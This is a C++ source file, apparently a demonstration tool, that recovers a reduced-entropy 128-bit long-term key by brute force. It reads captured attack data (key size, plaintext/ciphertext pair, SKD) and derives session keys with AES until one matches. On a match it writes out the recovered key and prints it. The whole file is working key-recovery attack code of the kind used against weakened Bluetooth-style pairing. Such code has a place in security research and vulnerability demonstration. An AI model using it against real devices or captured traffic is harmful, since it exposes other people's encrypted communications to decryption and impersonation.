#include <array>
#include <cstdint>
#include <fstream>
#include <iostream>
#include <stdexcept>
#include <string>
#include <chrono>          // <-- for timing
#include <openssl/aes.h>


void aes128_ecb_encrypt(const uint8_t key[16], const uint8_t in[16], uint8_t out[16]){
    AES_KEY aes_key;
    if (AES_set_encrypt_key(key, 128, &aes_key) != 0) {
        throw std::runtime_error("AES_set_encrypt_key failed");
    }
    AES_encrypt(in, out, &aes_key);
}

struct AttackData {
    uint8_t key_size;                 // 1 byte
    std::array<uint8_t, 16> P;        // plaintext / counter block
    std::array<uint8_t, 16> C;        // ciphertext / keystream
    std::array<uint8_t, 16> SKD;      // SKD
};

AttackData load_attack_data(const std::string &path) {
    AttackData d{};
    std::ifstream f(path, std::ios::binary);
    if (!f) {
        throw std::runtime_error("cannot open attack_data file: " + path);
    }

    char ks;
    f.read(&ks, 1);
    if (!f) {
        throw std::runtime_error("attack_data file too short (no key_size)");
    }
    d.key_size = static_cast<uint8_t>(ks);

    f.read(reinterpret_cast<char*>(d.P.data()),   16);
    f.read(reinterpret_cast<char*>(d.C.data()),   16);
    f.read(reinterpret_cast<char*>(d.SKD.data()), 16);
    if (!f) {
        throw std::runtime_error("attack_data file too short (expected 49 bytes)");
    }

    if (d.key_size == 0 || d.key_size > 16) {
        throw std::runtime_error("invalid key_size in attack_data");
    }

    return d;
}

void write_ltk(const std::string &path, const uint8_t ltk[16]) {
    std::ofstream f(path, std::ios::binary | std::ios::trunc);
    if (!f) {
        throw std::runtime_error("cannot open ltk output file: " + path);
    }
    f.write(reinterpret_cast<const char*>(ltk), 16);
}

// helper: convert byte array -> lowercase hex string
std::string to_hex(const uint8_t *data, std::size_t len) {
    static const char hex_digits[] = "0123456789abcdef";
    std::string s;
    s.reserve(len * 2);
    for (std::size_t i = 0; i < len; ++i) {
        uint8_t byte = data[i];
        s.push_back(hex_digits[byte >> 4]);
        s.push_back(hex_digits[byte & 0x0F]);
    }
    return s;
}

int main(int argc, char **argv) {
    if (argc != 3) {
        std::cerr << "Usage: " << argv[0]
                  << " attack_data.bin ltk_found.bin\n";
        return 1;
    }

    const std::string attack_path = argv[1];
    const std::string ltk_path    = argv[2];

    try {
        AttackData d = load_attack_data(attack_path);

        const int key_size   = static_cast<int>(d.key_size);
        const int zero_bytes = 16 - key_size;

        // We brute-force ALL key_size bytes.
        // This is only feasible for small key_size (e.g. <= 3).
        if (key_size > 6) {
            std::cerr << "key_size = " << key_size
                      << " is too large for naive brute-force demo.\n";
            return 3;
        }

        const int unknown_offset = zero_bytes;
        const int unknown_count  = key_size;

        // Base LTK: first (16 - key_size) bytes zero, rest will be brute-forced.
        std::array<uint8_t, 16> base_ltk{};
        base_ltk.fill(0x00);

        // total keys = 2^(8 * unknown_count)
        // (for unknown_count up to 6 this fits in 64-bit)
        const uint64_t total = (unknown_count == 0)
            ? 1
            : (1ULL << (8 * unknown_count));

        uint8_t sk[16];
        uint8_t test[16];

        std::cout << "Bruteforcing key_size=" << key_size
                  << " => " << total << " candidates\n";

        // ---- start timing just before the brute-force loop ----
        auto t_start = std::chrono::steady_clock::now();

        for (uint64_t i = 0; i < total; ++i) {
            // Map counter -> unknown bytes (big-endian mapping)
            std::array<uint8_t, 16> ltk = base_ltk;

            uint64_t tmp = i;
            for (int b = unknown_count - 1; b >= 0; --b) {
                uint8_t byte = static_cast<uint8_t>(tmp & 0xFF);
                ltk[unknown_offset + b] = byte;
                tmp >>= 8;
            }

            // SK = AES_128(LTK, SKD)
            aes128_ecb_encrypt(ltk.data(), d.SKD.data(), sk);

            // test = AES_128(SK, P)
            aes128_ecb_encrypt(sk, d.P.data(), test);

            bool match = true;
            for (int j = 0; j < 16; ++j) {
                if (test[j] != d.C[j]) {
                    match = false;
                    break;
                }
            }

            if (match) {
                auto t_end = std::chrono::steady_clock::now();
                std::chrono::duration<double> elapsed = t_end - t_start;

                std::cout << "Found LTK candidate, writing to " << ltk_path << "\n";
                write_ltk(ltk_path, ltk.data());

                // print LTK and SK in hex (lowercase, no spaces)
                std::cout << "LTK = " << to_hex(ltk.data(), 16) << "\n";
                std::cout << "SK  = " << to_hex(sk, 16)      << "\n";

                std::cout << "Bruteforce time: "
                          << elapsed.count() << " seconds\n";

                return 0;
            }
        }

        // No key found: also print how long we searched
        auto t_end = std::chrono::steady_clock::now();
        std::chrono::duration<double> elapsed = t_end - t_start;

        std::cerr << "No key found in search space\n";
        std::cerr << "Bruteforce time: "
                  << elapsed.count() << " seconds\n";
        return 2;

    } catch (const std::exception &e) {
        std::cerr << "Error: " << e.what() << "\n";
        return 1;
    }
}
